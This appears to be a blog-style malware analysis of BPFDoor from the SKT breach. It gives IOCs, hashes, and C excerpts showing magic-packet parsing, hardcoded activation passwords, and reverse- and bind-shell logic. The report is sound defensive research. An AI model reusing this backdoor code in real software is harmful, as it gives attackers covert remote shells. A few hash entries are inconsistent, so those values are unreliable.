---
title: MAL-250608-01-01
published: 2025-06-08
description: SKT (South Korea, ISP) - BPFDoor Analysis
tags: [analysis, c]
category: Malware Analysis
draft: false
lang: en
---

::github{repo="therustymate/Malware-Analysis"}

# MAL-250608-01-01

| Metadata           | Information                 |
|:-------------------|:----------------------------|
| Report ID          | MAL-250608-01-01            |
| Incident Date      | 2022-06/15 - 2025-04/22     |
| Report Date        | 2025-06/08                  |
| Malware Name       | BPFDoor                     |
| Version            | 01                          |
| Analyst            | @therustymate               |
| Organization       | Private                     |
| Severity           | Critical                    |
| Status             | Public/Draft                |
| Malware Type       | RAT                         |
| Detection Date     | 2025-04/18 06:09 PM         |
| Affected Systems   | Linux/HSS                   |
| CVE                | N/A                         |
| Tags               | Backdoor, ISP Hacking       |

## Incident Report
In the recent SKT cyberattack, threat actors gained initial access via a <u>web shell</u> from the external network, then penetrated into the internal network and deployed ***BPFdoor*** malware to compromise Linux-based HSS (Home Subscriber Server) systems. Approximately **9.8GB** of sensitive data (ex. IMSI) was exfiltrated during the intrusion.

### Incident Metadata
| Metadata                      | Information                                               |
|:------------------------------|:----------------------------------------------------------|
| Command & Control (C2) Server | 165.232.174[.]130                         |
| Indicators of Compromise      | 165.232.174[.]130                         |
| Infection Vector              | WebShell                                                  |
| Persistence Mechanisms        | BPF-based direct kernel code execution                    |
|                               | Raw socket-based custom packet trigger mechanism          |
| Payload Description           | Backdoor                                                  |
| Network Behavior              | Custom Packet Communication                               |

### File Names
| File Name             | Size          |
|:----------------------|:--------------|
| dbus-srv              | 34KB          |
| inode262394           | 28KB          |
| dbus-srv              | 34KB          |
| dbus-srv              | 34KB          |
| dbus-srv              | 34KB          |
| File_in_Inode_#1900667| 28KB          |
| gm                    | 2,063KB       |
| rad                   | 22KB          |

### Hashes
| File Name             | Hash Type   | Hash                                                              |
|:----------------------|:------------|:------------------------------------------------------------------|
| hpasmmld              | MD5         | a47d96ffe446a431a46a3ea3d1ab4d6e |
|                       | SHA1        | e6ccf59c2b7f6bd0f143cde356f60d2217120ad2 |
|                       | SHA256      | c7f693f7f85b01a8c0e561bd369845f40bff423b0743c7aa0f4c323d9133b5d4  |
|                       |             |                           |
| smartadm              | MD5         | 227fa46cf2a4517aa1870a011c79eb54    |
|                       | SHA1        | 466527d15744cdbb6e1d71129e1798acbe95764d    |
|                       | SHA256      | 3f6f108db37d18519f47c5e4182e5e33cc795564f286ae770aa03372133d15c4    |
|                       |             |                         |
| hald-addon-volume     | MD5         | f4ae0f1204e25a17b2adbbab838097bd    |
|                       | SHA1        | e3399ea3ebbbd47c588ae807c4bd429f6eef8deb    |
|                       | SHA256      | 95fd8a70c4b18a9a669fec6eb82dac0ba6a9236ac42a5ecde270330b66f51595    |
|                       |             |                             |
| dbus-srv-bin.txt      | MD5         | 714165b06a462c9ed3d145bc56054566    |
|                       | SHA1        | 2ca9a29b139b7b2993cabf025b34ead957dee08b    |
|                       | SHA256      | aa779e83ff5271d3f2d270eaed16751a109eb722fca61465d86317e03bbf49e4    |
| dbus-srv              | MD5         | 3c54d788de1bf6bd2e7bc7af39270540                                  |
|                       | SHA1        | 67a3a1f8338262cd9c948c6e55a22e7d9070ca6c                          |
|                       | SHA256      | 925ec4e617adc81d6fcee60876f6b878e0313a11f25526179716a90c3b743173  |
|                       |             |                                                                   |
| inode262394           | MD5         | fbe4d008a79f09c2d46b0bcb1ba926b3                                  |
|                       | SHA1        | 0f12ab32bac3f4db543f702d58368f20b6f5d324                          |
|                       | SHA256      | 29564c19a15b06dd5be2a73d7543288f5b4e9e6668bbd5e48d3093fb6ddf1fdb  |
|                       |             |                                                                   |
| dbus-srv              | MD5         | c2415a464ce17d54b01fc91805f68967                                  |
|                       | SHA1        | 4b6824ed764822dc422384cec89d45bbc682ef09                          |
|                       | SHA256      | be7d952d37812b7482c1d770433a499372fde7254981ce2e8e974a67f6a088b5  |
|                       |             |                                                                   |
| dbus-srv              | MD5         | aba893ffb1179b2a0530fe4f0daf94da                                  |
|                       | SHA1        | 213dbb5862a19a423e5b10789a07ee163ab71969                          |
|                       | SHA256      | 027b1fed1b8213b86d8faebf51879ccc9b1afec7176e31354fbac695e8daf416  |
|                       |             |                                                                   |
| dbus-srv              | MD5         | e2c2f1a1fbd66b4973c0373200130676                                  |
|                       | SHA1        | 7e7234c5e94a92dd8f43632aca1ac60db7d96d56                          |
|                       | SHA256      | a2ea82b3f5be30916c4a00a7759aa6ec1ae6ddadc4d82b3481640d8f6a325d59  |
|                       |             |                                                                   |
| File_in_Inode_#1900667| MD5         | dc3361ce344917da20f1b8cb4ae0b31d                                  |
|                       | SHA1        | c2717777ba2cb9a698889fca884eb7650144f32e                          |
|                       | SHA256      | e04586672874685b019e9120fcd1509d68af6f9bc513e739575fc73edefd511d  |
|                       |             |                                                                   |
| gm                    | MD5         | a778d7ad5a23a177f2d348a0ae4099772c09671e                          |
|                       | SHA1        | c2717777ba2cb9a698889fca884eb7650144f32e                          |
|                       | SHA256      | adfdd11d69f4e971c87ca5b2073682d90118c0b3a3a9f5fbbda872ab1fb335c6  |
|                       |             |                                                                   |
| rad                   | MD5         | 0bcd4f14e7d8a3dc908b5c17183269a4                                  |
|                       | SHA1        | b631d5ed10d0b2c7d9c39f43402cccde7f3cb5ea                          |
|                       | SHA256      | 7c39f3c3120e35b8ab89181f191f01e2556ca558475a2803cb1f02c05c830423  |

### References
:::caution
Some references may not be fully reliable.
:::

| Title                 | Link                                  |
|:----------------------|:--------------------------------------|
| KISA (boho.or.kr)     | [here](https://boho.or.kr/kr/bbs/view.do?bbsId=B0000133&menuNo=205020&nttId=71735) |
| Namu Wiki (namu.wiki) | [here](https://namu.wiki/w/SK%ED%85%94%EB%A0%88%EC%BD%A4%20%EC%9C%A0%EC%8B%AC%20%EC%A0%95%EB%B3%B4%20%EC%9C%A0%EC%B6%9C%20%EC%82%AC%EA%B3%A0) |
| korea.kr              | [here](https://www.korea.kr/briefing/policyBriefingView.do?newsId=156689741#:~:text=1%EC%B0%A8%20%EB%B0%9C%ED%91%9C%20%EC%9D%B4%ED%9B%84%20%EA%B3%B5%EA%B2%A9,%EC%9D%84%20%EC%99%84%EB%A3%8C%ED%95%A0%20%EC%98%88%EC%A0%95%EC%9E%85%EB%8B%88%EB%8B%A4.)

## Analysis

### Function/Symbol Table
| Function                  | Hex Location  | Description                                       |
|:--------------------------|:--------------|:--------------------------------------------------|
|`xchg()`                   | Unknown       | Exchange `a` and `b` in memory                    |
|`rc4_init()`               | Unknown       | Initialize RC4 encryption algorithm               |
| `rc4()`                   | Unknown       | Perform RC4 encryption                            |
| `cwrite()`                | Unknown       | Cipher writer                                     |
| `cread()`                 | Unknown       | Cipher reader                                     |
| `remove_pid()`            | Unknown       | Unlink (delete) `pid_path` file                   |
| `setup_time()`            | Unknown       | File timestamp manipulation (`1225394236` sec)    |
| `terminate()`             | Unknown       | Process termination event                         |
| `on_terminate()`          | Unknown       | `SIGTERM` (Process termination) event handler     |
| `init_signal()`           | Unknown       | Process termination event setup                   |
| `sig_child()`             | Unknown       | Child process termination event setup/handler     |
| `ptym_open()`             | Unknown       | Spawn a pseudo terminal master (virtual terminal) |
| `ptys_open()`             | Unknown       | Spawn a pseudo terminal slave (PTYM input object) |
| `open_tty()`              | Unknown       | Create a teletypewriter (terminal interface)      |
| `try_link()`              | Unknown       | Spawn a socket client object (reverse shell)      |
| `mon()`                   | Unknown       | Return `"1"` to the remote server (failed signal) |
| `set_proc_name()`         | Unknown       | Manipulate a process name through prctl syscall   |
| `to_open()`               | Unknown       | Check the access permision for the shell          |
| `logon()`                 | Unknown       | Password verification and command handler         |
| `packet_loop()`           | Unknown       | TCP, UDP, ICMP packet parser and handler          |
| `b()`                     | Unknown       | Spawn a socket bind server (random port)          |
| `w()`                     | Unknown       | Accept connections                                |
| `getshell()`              | Unknown       | Disable firewall and spawn a bind server          |
| `shell()`                 | Unknown       | Core command handler                              |
| `main()`                  | Unknown       | Entry point with configs                          |

### Magic Packet
The following code is the C structure of the magic packet used to activate BPFDoor.
```c
struct magic_packet{
    unsigned int    flag;
    in_addr_t       ip;
    unsigned short  port;
    char   pass[14];
} __attribute__ ((packed));
```


| Field         | Field Type        | Length    | Description           |
|:--------------|:------------------|:----------|:----------------------|
| flag          | `unsigned int`    | 4 bytes   | Not Used              |
| ip            | `in_addr_t`       | 4 bytes   | C2 Server IPv4 Address|
| port          | `unsigned short`  | 2 bytes   | C2 Server Port Number |
| pass          | `char [14]`       | 14 bytes  | Password/Command      |

The following C code parses custom magic packets delivered over TCP, UDP, and ICMP protocols. This indicates that BPFDoor is capable of establishing remote connections through packets using **TCP**, **UDP**, and **ICMP**.

```c
switch(ip->ip_p) {
    case IPPROTO_TCP:
        tcp = (struct sniff_tcp*)(buff+14+size_ip);
        size_tcp = TH_OFF(tcp)*4;
        mp = (struct magic_packet *)(buff+14+size_ip+size_tcp);
        break;
    case IPPROTO_UDP:
        udp = (struct sniff_udp *)(ip+1);
        mp = (struct magic_packet *)(udp+1);
        break;
    case IPPROTO_ICMP:
        pbuff = (char *)(ip+1);
        mp = (struct magic_packet *)(pbuff+8);
        break;
    default:
        break;
}
```

### Login Password

The login passwords received by the malware are as follows:
 - justforfun
 - socket
```c
{0x6a, 0x75, 0x73, 0x74, 0x66, 0x6f, 0x72, 0x66, 0x75, 0x6e, 0x00}; // justforfun
{0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74, 0x00}; // socket
```

```python
data = [0x6a, 0x75, 0x73, 0x74, 0x66, 0x6f, 0x72, 0x66, 0x75, 0x6e, 0x00]
for i in data:
    print(chr(i), end='')
    
>>> justforfun


data2 = [0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74, 0x00]
for i in data2:
    print(chr(i), end='')
    
>>> socket
```

If the transmitted value is **"justforfun"**, the malware establishes a TCP reverse shell to connect back to the C2 server.

- The function `try_link()` returns a TCP client socket object, which is stored in the variable `scli`.

- This `scli` object is then passed as an argument to the `shell()` function.

If the transmitted value is **"socket"**, the malware sets up a bind shell server, listening for incoming connections.

- The function `getshell()` calls another function `b()`, which returns a TCP listening socket (bind server).

- The resulting socket is stored in the variable `sockfd`, which is then passed as an argument to the `shell()` function.

In summary, the command structure of this malware operates as follows:
- `justforfun` command → Spawns a **reverse shell**
- `socket` command → Spawns a **bind shell**

```c
cmp = logon(mp->pass); // Check the command
switch(cmp) {
    case 1:
        strcpy(sip, inet_ntoa(ip->ip_src));
        getshell(sip, ntohs(tcp->th_dport));
        break;
    case 0:
        scli = try_link(bip, mp->port);
        if (scli > 0)
                shell(scli, NULL, NULL);
        break;
    case 2:
        mon(bip, mp->port);
        break;
}
```

### Port Range

When spawning a bind shell, the malware selects a random port within the range **42391** to **43390**.

```c
for (port = 42391; port < 43391; port++) { // 42391 - 43390
    my_addr.sin_port = htons(port);
    if( bind(sock_fd,(struct sockaddr *)&my_addr,sizeof(struct sockaddr)) == -1 ){
        continue;
    }
    if( listen(sock_fd,1) == 0 ) {
        *p = port;
        return sock_fd;
    }
    close(sock_fd);
}
return -1;
```